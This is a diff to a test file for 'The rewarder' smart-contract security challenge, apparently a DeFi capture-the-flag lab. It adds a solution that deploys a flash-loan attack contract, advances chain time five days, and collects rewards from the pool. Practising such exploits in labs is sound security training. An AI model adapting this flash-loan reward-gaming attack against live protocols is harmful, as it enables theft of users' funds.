@@ -70,6 +70,12 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const receiver = await (await ethers.getContractFactory('FlashReceiver', player)).deploy(
+            rewarderPool.address, flashLoanPool.address, rewardToken.address, liquidityToken.address
+        );
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        await receiver.connect(player).execute();
+        await receiver.connect(player).pullReward();
     });
 
     after(async function () {
@@ -103,3 +109,4 @@ describe('[Challenge] The rewarder', function () {
         ).to.eq(TOKENS_IN_LENDER_POOL);
     });
 });
+     
